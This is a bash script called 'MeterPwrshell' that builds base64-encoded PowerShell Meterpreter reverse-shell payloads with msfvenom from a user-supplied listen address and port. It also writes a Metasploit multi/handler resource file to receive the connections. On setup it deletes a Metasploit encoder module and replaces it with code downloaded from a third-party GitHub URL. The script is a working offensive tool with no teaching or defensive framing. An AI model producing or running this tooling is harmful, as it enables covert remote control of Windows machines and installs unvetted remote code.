#!/bin/bash
#colors
cyan='\e[0;36m'
green='\e[0;34m'
okegreen='\033[92m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
BlueF='\e[1;34m' #Biru
RESET="\033[00m" #normal
#installing prequisite
echo -e $red " [---] Installing Prequisite...... [---] "
apt-get install wget figlet
clear
echo -e $red " [------------------------------------------]"
echo -e $red " [---] Installing And Adding The Prequisite...... [---] "
echo -e $red "[---] Example Of MSF Directory Path Is : /usr/share/metasploit-framework [---]"
echo -ne $red " YOUR METASPLOIT-FRAMEWORK DIRECTORY PATH WITHOUT SLASH ON THE BACKEND : ";tput sgr0
read msfpath
rm $msfpath/modules/encoders/cmd/base64.rb
wget https://raw.githubusercontent.com/pr0xy-8L4d3/powershell-base64-encoder/master/base64.rb && mv base64.rb $msfpath/modules/encoders/cmd/
rm base64.rb
mkdir output
clear
#checking if the input is correct
check ()
{
cat << !
  Generate PowerShell Payload Input
  +------------++-------------------------++-----------------------+
  | Name       ||  Descript               || Your Input
  +------------++-------------------------++-----------------------+
  | LHOST      ||  The Listen Address     || $yourip
  | LPORT      ||  The Listen Ports       || $yourport
  | PAYFILETYPE||  The Payload Type       || $msfpaytype
  | ARCH       ||  The Payload Arch       || $payarch
  +------------++-------------------------++-----------------------+
!
}

#menu
echo ""
echo -e $okegreen " [---] MeterPwrshell - Meterpreter Powershell Payload With Base64 Encoded [---] "
echo -e $okegreen "      [---Generate Meterpreter Powershell Payload With Base64 Encoded---]       "
figlet "...MeterPwrshell..."
echo -e $okegreen "              [---] Tool Programmed By GetRektBoy724 [---]                 "
echo -e $okegreen "              [---]     Codename : ILoveAnyShell     [---]                 "
echo -e $okegreen "              [---]         Version : v2.2           [---]                 "
echo -e $okegreen "       [---] Follow Me At : https://github.com/GetRektBoy724 [---]         "
echo -e $okegreen " [-----------------------------------------------------------] "
echo -e $okegreen "If You Want To Quit The Program...Just Press control-c!!"
echo -e $okegreen "Please Fill This Form First!!"
echo -ne $BlueF "SET MSF PAYLOAD TYPE : ";tput sgr0
read msfpaytype
echo -e $BlueF " [--------------------] "
echo -ne $BlueF "SET LHOST : ";tput sgr0
read yourip
echo -e $BlueF " [--------------------] "
echo -ne $BlueF "SET LPORT : ";tput sgr0
read yourport
echo -e $BlueF " [--------------------] "
echo -ne $BlueF "YOUR PAYLOAD ARCHITECTURE : ";tput sgr0
read payarch
echo -e $BlueF " [--------------------] "
check
echo -e $BlueF "Please Wait....This Gonna Take A Few Minutes......."
echo -e $red "[-------------------------BEGIN DEBUG ZONE-------------------------]"
msfvenom -p $msfpaytype LHOST=$yourip LPORT=$yourport --smallest -f psh > 1.ps1
cat 1.ps1 | msfvenom -e cmd/base64 -a $payarch --platform windows NOEXIT -o meterpwrshelloutput$payarch.txt
mv meterpwrshelloutput$payarch.txt output/
echo -e "use multi/handler\nset payload $msfpaytype\nset lhost $yourip\nset lport $yourport\nset ExitOnSession false\nset AutoVerifySession false\nset AutoSystemInfo false\nset AutoLoadStdapi false\nexploit -j" >> meterpwrshellhandler$payarch.rc
mv meterpwrshellhandler$payarch.rc output/
rm 1.ps1
echo -e $red "[--------------------------END DEBUG ZONE--------------------------]"
echo -e $okegreen "[---] The Meterpreter Powershell Payload Has Been Maked By MSFVenom [---]"
echo -e $okegreen "[---] The Output File Is On The : output/meterpwrshelloutput.txt [---]"
echo -e $okegreen "[---] The Handler File Is On The : output/meterpwrshellhandler.rc [---]"
figlet "...GoodBye..."
